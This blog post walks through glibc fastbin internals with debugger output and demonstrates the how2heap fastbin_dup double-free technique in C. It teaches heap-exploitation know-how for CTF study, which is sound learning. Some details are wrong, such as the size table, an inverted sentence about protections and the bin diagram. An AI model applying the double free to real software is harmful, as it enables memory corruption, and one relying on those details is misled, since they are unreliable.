---
title: "Glibc 2.23/2.33 Ptmalloc2 Fastbin"
toc_sticky: true
toc_title: ""
categories:
  - ctf
tags:
  - unix
  - pwn
---

## Explanation, Implementation, and Exploitation

In this post, I will be going through and explaining each of the fastbin attacks showcased within how2heaps
glibc 2.23 repository. This will show how we can apply and leverage these techniques to solve a ctf challenge.

We will also be discussing the fastbin_reverse_into_tcache.c, which was showcased within a ctf challenge
at HITCON originally. This technique had later been discovered by the securitylab over at github, and
was leveraged in order to successfully exploit a vulnerability within ubuntu's SANE. There is an amazing
repository and video that showcases and explains each of the techniques, and his thought process when
discovering and exploiting this bug.

Here is the source to the blog post:

[house of force](https://securitylab.github.com/research/last-orders-at-the-house-of-force/)

Anyways, here is the table of contents on the techniques we will be explaining today:

```text
NAME:                             OLDEST         LATEST
- fastbin_dup                   - glibc 2.23 --> glibc 2.33
- fastbin_dup_into_stack        - glibc 2.23 --> glibc 2.23
- fastbin_dup_consolidate       - glibc 2.23 --> glibc 2.23
- fastbin_reverse_into_tcache   - glibc 2.27 --> glibc 2.33
```

Lets start off with a simple explanation of what a fastbin is, and what it does within ptmalloc's massive
caching ecosystem. A fastbin's purpose seems to be self explanatory, given its name, but its not exactly
well explained in any posts that ive read. Thanks to a cool 31337 friend called parrot, I was able to
better understand what the fastbin was actually for.

fastbins are special bins that cache smaller chunks, and are meant for optimal speed when caching and
accessing stored chunks. It is a LIFO singly linked list of 10 index's based on allocation size. This is
which is meant to increase performance and reduce overhead, as there is no need for removal of chunks
from the middle of the fastbin. The chunk sizes will begin at 0x20, which is the minimum chunk size
including metadata.

The fastbin will increase by chunk sizes with index's, which is very similar to the tcache. Lets take a look
at this in action.

clone and compile the malloc playground from this repository, and lets take a good look at how this works

https://github.com/shellphish/how2heap

```nasm
pid: 188286

> malloc 24
==> 0x559c879fe2a0

> malloc 24
==> 0x559c879fe2c0

> free 0x559c879fe2a0
==> ok

> free 0x559c879fe2c0
==> ok

> malloc 40
==> 0x559c879fe2e0

> malloc 40
==> 0x559c879fe310

> free 0x559c879fe2e0
==> ok

> free 0x559c879fe310
==> ok
```

okay, so we have allocated and freed 4 chunks in total. We have 2 chunks of size 33(including metadata), and
2 chunks of size 49(including metadata). The useable size for each of these chunks are 24, and 40 bytes.

Lets attach the playground in a debugger, preferably gef, and take a look at the bins/chunks that exist.

also, to make things less confusing, you can use read() within the playground instead of fgets(), which
will utilize malloc internally, and potentially mess up our playtime. You can also remove the trailing
'\n' with this little snippet of code:

```c
buffer[strcspn(buffer,"\n")]=0;
```

which counts the index until \n is reached, and change it into a null terminator for the string.

anyways, lets check it out in gdb.

```nasm
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────── registers ───
$rax   : 0xfffffffffffffe00
$rbx   : 0x0000559c860ac800  →  <__libc_csu_init+0> endbr64
$rcx   : 0x00007efdbb4b5052  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x3e8
$rsp   : 0x00007ffe76fe9ef8  →  0x0000559c860ac40f  →  <main+164> test rax, rax
$rbp   : 0x00007ffe76fea720  →  0x0000000000000000
$rsi   : 0x00007ffe76fe9f40  →  "usable 0x559c879fe310"
$rdi   : 0x0
$rip   : 0x00007efdbb4b5052  →  0x5677fffff0003d48 ("H="?)
$r8    : 0x2
$r9    : 0x00007ffe76fe7c00  →  0x0000000000000000
$r10   : 0x28
$r11   : 0x246
$r12   : 0x0000559c860ac190  →  <_start+0> endbr64
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────── stack ───
0x00007ffe76fe9ef8│+0x0000: 0x0000559c860ac40f  →  <main+164> test rax, rax      ← $rsp
0x00007ffe76fe9f00│+0x0008: 0x00007ffe76fea818  →  0x00007ffe76feb2a3  →  "malloc_playground"
0x00007ffe76fe9f08│+0x0010: 0x0000000100000000
0x00007ffe76fe9f10│+0x0018: 0x0000000000000000
0x00007ffe76fe9f18│+0x0020: 0x0000000200000000
0x00007ffe76fe9f20│+0x0028: 0x0000559c879fe310  →  0x00005599de579b1e
0x00007ffe76fe9f28│+0x0030: 0x0000000000000000
0x00007ffe76fe9f30│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ───
   0x7efdbb4b504c <read+12>        test   eax, eax
   0x7efdbb4b504e <read+14>        jne    0x7efdbb4b5060 <read+32>
   0x7efdbb4b5050 <read+16>        syscall
 → 0x7efdbb4b5052 <read+18>        cmp    rax, 0xfffffffffffff000
   0x7efdbb4b5058 <read+24>        ja     0x7efdbb4b50b0 <read+112>
   0x7efdbb4b505a <read+26>        ret
   0x7efdbb4b505b <read+27>        nop    DWORD PTR [rax+rax*1+0x0]
   0x7efdbb4b5060 <read+32>        sub    rsp, 0x28
   0x7efdbb4b5064 <read+36>        mov    QWORD PTR [rsp+0x18], rdx
──────────────────────────────────────────────────────────────────────────────────────────────── threads ───
[#0] Id 1, Name: "malloc_playgrou", stopped 0x7efdbb4b5052 in read (), reason: STOPPED
────────────────────────────────────────────────────────────────────────────────────────────────── trace ───
[#0] 0x7efdbb4b5052 → read()
[#1] 0x559c860ac40f → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────

gef➤  heap bins
────────────────────────────────────────── Tcachebins for thread 1 ─────────────────────────────────────────
Tcachebins[idx=0, size=0x20] count=2  ←  Chunk(addr=0x559c879fe2c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x559c879fe2a0, size=0x20, flags=PREV_INUSE)
Tcachebins[idx=1, size=0x30] count=2  ←  Chunk(addr=0x559c879fe310, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x559c879fe2e0, size=0x30, flags=PREV_INUSE)
───────────────────────────────────── Fastbins for arena 0x7efdbb586a00 ────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────── Unsorted Bin for arena 'main_arena' ───────────────────────────────────
[+] Found 0 chunks in unsorted bin.
───────────────────────────────────── Small Bins for arena 'main_arena' ────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────── Large Bins for arena 'main_arena' ────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤
```

okay, to those who dont use gef, this may look like a big pile of nonsense to you, so here is the important
part of this debugger output:

```nasm
Tcachebins[idx=0, size=0x20] count=2  ←  Chunk(addr=0x559c879fe2c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x559c879fe2a0, size=0x20, flags=PREV_INUSE)
Tcachebins[idx=1, size=0x30] count=2  ←  Chunk(addr=0x559c879fe310, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x559c879fe2e0, size=0x30, flags=PREV_INUSE)
```

These are the tcache bins for thread 1, I am assuming prior knowledge into the inner machinations of the
tcache, so I will not be covering that as of right now. Remember, we allocated 4 chunks in total, 1 with
the size of 32, and the other with the size of 48. With the extra bit flags, that would equal to 33 and
49, but the specifics of the size do not matter, the only thing that we should not is that there are
2 chunks, in 2 tcache bins.

There will be 7 entries maximum within a tcache bin, and 64 bins per thread. If we look closely at each
value presented to us within the output, we can see each of the "size=" outputs. We allocated 32 and
48 byte chunks right?

What are those values in decimal?

```py
>>> 0x30
48
>>> 0x20
32
>>>
```

oh, okay cool.

So we will have a new tcache bin, for each chunk size, and it will go all the way up until 64 bins have
been reached. which means that if each chunk will start at 0x20, and increments by 0x10(16 in decimal), then
the maximum chunk size that the tcache will be able to store is 1032 bytes, or 1040 if you include the
metadata.

Lets visualize the tcache:

- 2 bins - idx 0 ; idx 1
- 2 counts within each bin

```text
BIN 0(0x20):                           BIN 1(0x30):
         +---+---+---+---+---+---+---+ +---+---+---+---+---+---+---+
counts:  | 0 | 1 |   |   |   |   |   | | 0 | 1 |   |   |   |   |   |
         +---+---+---+---+---+---+---+ +---+---+---+---+---+---+---+
entries: |ptr|ptr|   |   |   |   |   | |ptr|ptr|   |   |   |   |   |
         +---+---+---+---+---+---+---+ +---+---+---+---+---+---+---+
         |   +------+                  |   |
         |          |                  |   |
     +---V---+   +--V----+             |   |
     | entry |-->| entry |             |   |
     +-------+   +-------+             |   |
         |           |                 |   |
HEAP:    |           +----------------+|   |
+--------V--------------------------+ ||   |
| [metadata] [flags] [usable chunk] | ||   |
| [metadata] [flags] [usable chunk]<--+|   |
|                                   |  |   |
|    +---------------------------------+   |
|    V                              |      |
| [metadata] [flags] [usable        |      |
| chunk  ] [metdata] [flags][usable |      |
|     chunk  ]  Λ                   |      |
|               +--------------------------+
|                                   |
|                                   |
|                                   |
|                                   |
|                       [wilderness]|
+-----------------------------------+
```

obviously, this is not to scale, but this is a pretty accurate depiction of how the tcache looks inside of
my head. The concept that I am attempting to communicate to you, is that there is a NEW tcache bin, for each
chunk size that gets allocated. This is also the case with the fastbins, in which I will get into later.

Now that we understand this whole size thing, what sizes does the fastbin store?

You might have already seen from the debugger output, but it will store chunk sizes:

```nasm
0x20    - 0
0x30    - 1
0x40    - 2
0x50    - 3
0x60    - 4
0x70    - 5
0x80    - 6
0x90    - 7
0x100   - 8
0x110   - 9
```

okay, so now we understand how each bin stores chunks based on sizes, but what else does it do?

Remember, they are a singly linked list of 10 bins, that contain recently freed small chunks. They
are singly linked, and LIFO since they do not need to remove chunks from the middle of the list, nor
does the ordering of the chunks matter in the context that each fastbin will be used.

However, they will also ALWAYS have their inuse bit flag set, which means it will NOT consolidate with
other chunks, or the top chunk. This means that the fastbin will act as a special bin of sorts, that
can enable requests for new chunks of the same size to be handled extremely quickly. Consolidation is
the process of merging together two chunks, and the fact that the chunks stored within the fastbin
do not want to participate in this consolidation event, there can be an increase in memory fragmentation
on the heap.

Due to this fact, the fastbin has a special function that will consolidate the specified chunk called
malloc_consolidate. This means that they will be consolidated with neighboring chunks only in bulk when 
malloc_consolidate has been called.

Now lets talk about why consoliation is extremely necessary, and the looming threat of extreme
fragmentation within dynamic memory.

Lets allocate 3 small chunks of size 32:

```text
[chunk][chunk][chunk]
```

okay, now lets free the middle chunk:

```text
[chunk]       [chunk]
```

cool, but what if we want to allocate a larger chunk?

```text
[chunk]       [chunk][   chunk   ]
```

okay, well now that chunk is no longer usable when allocating chunks larger than it. This is dynamic memory
fragmentation at it's simplest. This issue happens across multiple constructs, one of these including
the disk. When swapping in an operating system that uses segmented memory, disk fragmentation is
extremely common, which is why the older versions of windows had a disk defragger.

Cool, but we never actually mentioned how the fastbin is put to use. This was what had confused me for
such a long time, so I will explain to you as best I can.

We know that the tcache has 7 entries per bin, and 1 bin per size chunks right? What would happen if
we allocated and freed 8 chunks of the same size, what would happen then, would tcache just throw away
the FI pointer?

This is where the fastbin will come in, if the size can fit within the fastbin chunks, it will be thrown
straight into the fastbin. We can see this being demonstrated on, again, how2heaps malloc playground. Lets
allocate a bunch of chunks of the same size, and free them. We can then inspect this process within gdb and
see the bins that exist. If this goes correctly, we should see a few chunks being used within the fastbin:

```nasm
pid: 203365
> malloc 24
==> 0x5581bc92f2a0

> malloc 24
==> 0x5581bc92f2c0

> malloc 24
==> 0x5581bc92f2e0

> malloc 24
==> 0x5581bc92f300

> malloc 24
==> 0x5581bc92f320

> malloc 24
==> 0x5581bc92f340

> malloc 24
==> 0x5581bc92f360

> malloc 24
==> 0x5581bc92f380

> malloc 24
==> 0x5581bc92f3a0

> malloc 24
==> 0x5581bc92f3c0

> free 0x5581bc92f2a0
==> ok

> free 0x5581bc92f2c0
==> ok

> free 0x5581bc92f2e0
==> ok

> free 0x5581bc92f300
==> ok

> free 0x5581bc92f320
==> ok

> free 0x5581bc92f340
==> ok

> free 0x5581bc92f360
==> ok

> free 0x5581bc92f380
==> ok

> free 0x5581bc92f3a0
==> ok

> free 0x5581bc92f3c0
==> ok
```

we could have easily written a script to do this for us, instead of tediously going through this
manually, but i wanted to still have an interactive prompt, rather than constantly recompiling and editing
my script. Of course, we could add an extra function to automatically fill up the tcache, allocate into
the fastbin, and drop back into the prompt, but im lazy, dumb, and spiteful.

Lets take a look at the debugger output:

```nasm
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00005581baeca800  →  <__libc_csu_init+0> endbr64
$rcx   : 0x00007f08a8945052  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x3e8
$rsp   : 0x00007ffd82249188  →  0x00005581baeca40f  →  <main+164> test rax, rax
$rbp   : 0x00007ffd822499b0  →  0x0000000000000000
$rsi   : 0x00007ffd822491d0  →  "free 0x5581bc92f3c0"
$rdi   : 0x0
$rip   : 0x00007f08a8945052  →  0x5677fffff0003d48 ("H="?)
$r8    : 0x2
$r9    : 0xffffffffffffff00
$r10   : 0x00007f08a89c8ac0  →  0x0000000100000000
$r11   : 0x246
$r12   : 0x00005581baeca190  →  <_start+0> endbr64
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd82249188│+0x0000: 0x00005581baeca40f  →  <main+164> test rax, rax      ← $rsp
0x00007ffd82249190│+0x0008: 0x00007ffd82249aa8  →  0x00007ffd8224a27f  →  "malloc_playground"
0x00007ffd82249198│+0x0010: 0x0000000100000000
0x00007ffd822491a0│+0x0018: 0x0000000000000000
0x00007ffd822491a8│+0x0020: 0x0000000200000000
0x00007ffd822491b0│+0x0028: 0x00005581bc92f3c0  →  0x00005584e4893abf
0x00007ffd822491b8│+0x0030: 0x0000000000000000
0x00007ffd822491c0│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f08a894504c <read+12>        test   eax, eax
   0x7f08a894504e <read+14>        jne    0x7f08a8945060 <read+32>
   0x7f08a8945050 <read+16>        syscall
 → 0x7f08a8945052 <read+18>        cmp    rax, 0xfffffffffffff000
   0x7f08a8945058 <read+24>        ja     0x7f08a89450b0 <read+112>
   0x7f08a894505a <read+26>        ret
   0x7f08a894505b <read+27>        nop    DWORD PTR [rax+rax*1+0x0]
   0x7f08a8945060 <read+32>        sub    rsp, 0x28
   0x7f08a8945064 <read+36>        mov    QWORD PTR [rsp+0x18], rdx
──────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "malloc_playgrou", stopped 0x7f08a8945052 in read (), reason: STOPPED
────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f08a8945052 → read()
[#1] 0x5581baeca40f → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────
Tcachebins[idx=0, size=0x20] count=7  ←  Chunk(addr=0x5581bc92f360, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f340, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f320, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f300, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f2e0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f2c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f2a0, size=0x20, flags=PREV_INUSE)
───────────────────────────────────── Fastbins for arena 0x7f08a8a16a00 ─────────────────────────────────────
Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x5581bc92f3c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f3a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f380, size=0x20, flags=PREV_INUSE)
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
───────────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤
```

again, this is the important part of the output:

```nasm
────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────
Tcachebins[idx=0, size=0x20] count=7  ←  Chunk(addr=0x5581bc92f360, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f340, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f320, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f300, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f2e0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f2c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f2a0, size=0x20, flags=PREV_INUSE)
───────────────────────────────────── Fastbins for arena 0x7f08a8a16a00 ─────────────────────────────────────
Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x5581bc92f3c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f3a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5581bc92f380, size=0x20, flags=PREV_INUSE)
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```

It now seems that i have crawled out of my cave and decided to put in effort, so here is my script that
will demonstrate fastbin caching:

```c
#include <stdio.h>
#include <stdlib.h>
int main() {
    void*ptrs[20];
    int i=0;
    fprintf(stderr,"Allocating 20 chunks, 32 bytes including metadata\n");
    for (i=0;i<20;i++) {
        ptrs[i]=(void*)malloc(24);
        fprintf(stderr,"malloc \t#%d \t@ \t%p\n",i,ptrs[i]);
    }
    getchar();
    fprintf(stderr,"Freeing all chunks in REVERSE order\n");
    do {
        i--;
        fprintf(stderr,"free \t#%d \t@ \t%p\n",i,ptrs[i]);
        free(ptrs[i]);
    }while(i>0);
    getchar();
}
```

Its an extremely simple script that will simply allocate 20 chunks, with a useable chunk size of 24. It
will store each pointer within an array of void pointers, then free them in REVERSE order. This is
important, as I have noticed that freeing chunks in the wrong order will mean that they do not end up in
the fastbin.

I am going to be honest with you, I have no idea why this occurs. Anyways, it appears to just work, and
here is the output of the script:

```nasm
malloc  #0      @       0x561e48faa2a0
malloc  #1      @       0x561e48faa2c0
malloc  #2      @       0x561e48faa2e0
malloc  #3      @       0x561e48faa300
malloc  #4      @       0x561e48faa320
malloc  #5      @       0x561e48faa340
malloc  #6      @       0x561e48faa360
malloc  #7      @       0x561e48faa380
malloc  #8      @       0x561e48faa3a0
malloc  #9      @       0x561e48faa3c0
malloc  #10     @       0x561e48faa3e0
malloc  #11     @       0x561e48faa400
malloc  #12     @       0x561e48faa420
malloc  #13     @       0x561e48faa440
malloc  #14     @       0x561e48faa460
malloc  #15     @       0x561e48faa480
malloc  #16     @       0x561e48faa4a0
malloc  #17     @       0x561e48faa4c0
malloc  #18     @       0x561e48faa4e0
malloc  #19     @       0x561e48faa500

free    #19     @       0x561e48faa500
free    #18     @       0x561e48faa4e0
free    #17     @       0x561e48faa4c0
free    #16     @       0x561e48faa4a0
free    #15     @       0x561e48faa480
free    #14     @       0x561e48faa460
free    #13     @       0x561e48faa440
free    #12     @       0x561e48faa420
free    #11     @       0x561e48faa400
free    #10     @       0x561e48faa3e0
free    #9      @       0x561e48faa3c0
free    #8      @       0x561e48faa3a0
free    #7      @       0x561e48faa380
free    #6      @       0x561e48faa360
free    #5      @       0x561e48faa340
free    #4      @       0x561e48faa320
free    #3      @       0x561e48faa300
free    #2      @       0x561e48faa2e0
free    #1      @       0x561e48faa2c0
free    #0      @       0x561e48faa2a0
```

it will then continue to prompt us for input, which gives us time to attach the program to a debugger and
inspect the bins and chunks of the binary. Here is the important stuff:

```nasm
────────────────────────────────────────── Tcachebins for thread 1 ─────────────────────────────────────────
Tcachebins[idx=0, size=0x20] count=7  ←  Chunk(addr=0x561e48faa440, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa460, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa480, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa4a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa4c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa4e0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa500, size=0x20, flags=PREV_INUSE)
───────────────────────────────────── Fastbins for arena 0x7f885bfa5a00 ────────────────────────────────────
Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x561e48faa2a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa2c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa2e0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa300, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa320, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa340, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa360, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa380, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa3a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa3c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa3e0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa400, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x561e48faa420, size=0x20, flags=PREV_INUSE)
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```

As we can see, there is a massive amount of cached chunks that are utilizing our fastbin, which does not
have much memory protections against attacks like double frees. The reason behind showing you this, was
to hopefully communicate and accentuate the usage of the fastbin. There also seems to be no limit on the
amount of chunks that a single fastbin can store, so that is also another interesting fact.

Another important functionality of the fastbin is that it will copy chunks in reverse order back into the
tcache if certain conditions are met. Lets take a look at this snippet of code from the malloc source code
(which is the best resource when learning ptmalloc internals).

```c
3608                   /* While bin not empty and tcache not full, copy chunks.  */
3609                   while (tcache->counts[tc_idx] < mp_.tcache_count
3610                          && (tc_victim = *fb) != NULL)
3611                     {
3612                       if (SINGLE_THREAD_P)
3613                         *fb = tc_victim->fd;
3614                       else
3615                         {
3616                           REMOVE_FB (fb, pp, tc_victim);
3617                           if (__glibc_unlikely (tc_victim == NULL))
3618                             break;
```

When it says bin, it is refering to the fastbin. So it will say, if the tcache is empty, and the fastbin
IS NOT empty, it will copy all the chunks from the fastbin into the tcache, in reverse order, UNTIL the
tcache is full again. The reasoning behind them being transfered into the tcache, is due to the fact that
a fastbin is a LIFO singly linked list. This is not exactly a feature, so much as it is an inherent trait
of LIFO data structures.

In a later post, we will talk about a technique called fastbin_reverse_into_tcache that can demonstrate this
interesting mechanism, and it's exploitation.

I did not see this mentioned ANYWHERE, instead I had to rely on how2heaps malloc_playground. I have been
playing around with chunks for about an hour or two attempting to understand the machinations that lie behind
the mysterious fastbins. I am still extremely salty about the fact that nobody that I could find, has given
a well thought out and in depth answer into what a fastbin was for, and what it actually does.

If there are any good posts detailing the fastbin, please send them to me via my contacts. as i
do not believe that it actually exists. The how2heap fastbin technique scripts have helped me generally
understand and get a small grasp on what exactly gets cached within the fastbin. I highly reccomend checking
their github repo, if you've been living under a rock.

The world of dynamic memory allocation is growing rapidly, as the tcache was only introduces around 4 years
ago. That being said, before the thread local caching existed, the fastbin, unsorted bin, and small/large
bins served more active purposes than they do today. As of modern day glibc, tcache does a massive amount
of the work, whilst the other caching bins simply serve as a lazy older brother.

I can only assume that within a few years time, this post will become outdated and false as well, but if
you spot anything within here that is false, or a complete and utter lie dreampt up by my ill mind, please
inform me via my contacts.

Okay, now that we understand what the fastbin is, and it's properties within dynamic memory, lets take
a look at the first and simplest example code.

### fastbin_dup.c

Lets take a look at the source code for this script:

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
int main() {
        setbuf(stdout, NULL);

        printf("This file demonstrates a simple double-free attack with fastbins.\n");

        printf("Fill up tcache first.\n");
        void *ptrs[8];
        for (int i=0; i<8; i++) {
                ptrs[i] = malloc(8);
        }
        for (int i=0; i<7; i++) {
                free(ptrs[i]);
        }

        printf("Allocating 3 buffers.\n");
        int *a = calloc(1, 8);
        int *b = calloc(1, 8);
        int *c = calloc(1, 8);

        printf("1st calloc(1, 8): %p\n", a);
        printf("2nd calloc(1, 8): %p\n", b);
        printf("3rd calloc(1, 8): %p\n", c);

        printf("Freeing the first one...\n");
        free(a);

        printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
//      free(a);

        printf("So, instead, we'll free %p.\n", b);
        free(b);

        printf("Now, we can free %p again, since it's not the head of the free list.\n", a);
        free(a);

        printf("Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
        a = calloc(1, 8);
        b = calloc(1, 8);
        c = calloc(1, 8);
        printf("1st calloc(1, 8): %p\n", a);
        printf("2nd calloc(1, 8): %p\n", b);
        printf("3rd calloc(1, 8): %p\n", c);

        assert(a == c);
}
```

This technique will work on the most recent version of glibc, which is 2.33, and the essence of this
technique relies on the fact that fastbins does as many protections as the tcache. With this in mind, we
can trick malloc into duplicating a pointer to a chunk which can create massive security vulnerabilities
like write what where primitives and et cetera thanks to the fastbin freelist.

The only thing that these caching mechanisms can rely on, is the metadata and pointers provided to them.
This makes the dynamic memory scene grow and evolve extremely quickly, as there are CONSTANTLY new
protections and checks placed within ptmalloc2 to prevent attacks against heap metadata.

Okay, lets get back onto the script, first it will fill up the tcache by allocating and freeing 7 chunks.

The reason behind needing to fill up the tcache, and caching our double freed pointer within the
fastbin, is due to the protections that tcache now has. If we were to just simply double free, it would
abort and prompt us with "double free detected in tcache n".

So, we will need to fill up the tcache bins, and allocate into the fastbin

a double free is sort of like a loophole in how bins cache chunks, we had already said that they only
store pointers right? So what would happen to a bin if we were to free the SAME chunk twice.

```c
a = malloc(n);
free(a);
free(a);
```

```text
tcache:
+---------++---------+
|    a    ||    a    |
+---------++---------+
```

of course, freeing a chunk does not get rid of the values, it simply overwrites the useable chunk with
more metadata, and caches it. It DOES NOT get rid of any data, it will not affect anything on the chunk
besides writing extra metadata.

okay, so we just tricked free into caching the same chunk twice, lets see what happens when we allocate
two more chunks

```c
b = malloc(n);
c = malloc(n);
```

these will both return pointers to the a chunk, so we have now duplicated a pointer using a double free

if we were to do the same archaic technique of freeing the same chunk twice, we would get this message:

```text
double free or corruption (fasttop)
```

it had deteted a double free or metadata corruption on the first chunk within the fastbin, which is what
fasttop means. So how can we get around this? what can we do?

well, we can create a loophole of sorts in how it mitigates consecutive double frees.

What if we double free within the fastbin, out of order?

This script demonstrates that, it will allocate 3 chunks, each 24 usable chunk sizes.
the heap layout will look like this:

```text
metadata-----------+-----------------+
|                  |                 |
V                  V                 V
+------++---------++------++---------++------++---------+
| 0x21 ||    a    || 0x21 ||    b    || 0x21 ||    c    |
+------++---------++------++---------++------++---------+
        |                  |                  |
        +------------------+------------------+
        |
chunks<-+

tcache(full):
+---++---++---++---++---++---++---+
| 0 || 1 || 2 || 3 || 4 || 5 || 6 |
+---++---++---++---++---++---++---+

fastbin:

   0       1       2       3       4       5       6       7       8       9
  0x20    0x30    0x40    0x50    0x60    0x70    0x80    0x90   0x100   0x110
+------++------++------++------++------++------++------++------++------++------+
|      ||      ||      ||      ||      ||      ||      ||      ||      ||      |
+------++------++------++------++------++------++------++------++------++------+
```

now lets perform our fastbin dup, and see what happens to the fastbin:

```c
free(a);
free(b);
free(a);
```

```text
fastbin:

   0       1       2       3       4       5       6       7       8       9
  0x20    0x30    0x40    0x50    0x60    0x70    0x80    0x90   0x100   0x110
+------++------++------++------++------++------++------++------++------++------+
|  a   ||  b   ||  a   ||      ||      ||      ||      ||      ||      ||      |
+------++------++------++------++------++------++------++------++------++------+
```

lets malloc, and see what pointers we get returned

```text
fastbin:

   0       1       2       3       4       5       6       7       8       9
  0x20    0x30    0x40    0x50    0x60    0x70    0x80    0x90   0x100   0x110
+------++------++------++------++------++------++------++------++------++------+
|      ||      ||      ||      ||      ||      ||      ||      ||      ||      |
+------++------++------++------++------++------++------++------++------++------+
```

```c
malloc(24); // a
malloc(24); // b
malloc(24); // a
```

malloc will return a pointer to the "a" chunk
the second will return a pointer to the "b" chunk
this will return a duplicated pointer to the "a" chunk

tl;dr, tcache has a protection against double frees, whilst the fastbin does not. We can leverage
this to successfully exploit a double free, and in this case, duplicate a pointer to a chunk in memory.

